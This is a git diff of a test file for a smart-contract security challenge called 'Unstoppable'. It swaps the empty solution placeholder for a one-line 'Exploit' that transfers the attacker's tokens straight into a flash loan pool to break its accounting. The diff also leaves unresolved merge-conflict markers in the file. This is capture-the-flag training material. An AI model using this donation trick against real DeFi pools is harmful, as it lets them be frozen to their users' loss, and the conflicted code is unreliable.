@@ -43,8 +43,13 @@ describe('[Challenge] Unstoppable', function () {
         await receiverContract.executeFlashLoan(100n * 10n ** 18n);
     });
 
+<<<<<<< Updated upstream
     it('Execution', async function () {
         /** CODE YOUR SOLUTION HERE */
+=======
+    it('Exploit', async function () {
+        await this.token.transfer(this.pool.address, INITIAL_ATTACKER_TOKEN_BALANCE);
+>>>>>>> Stashed changes
     });
 
     after(async function () {
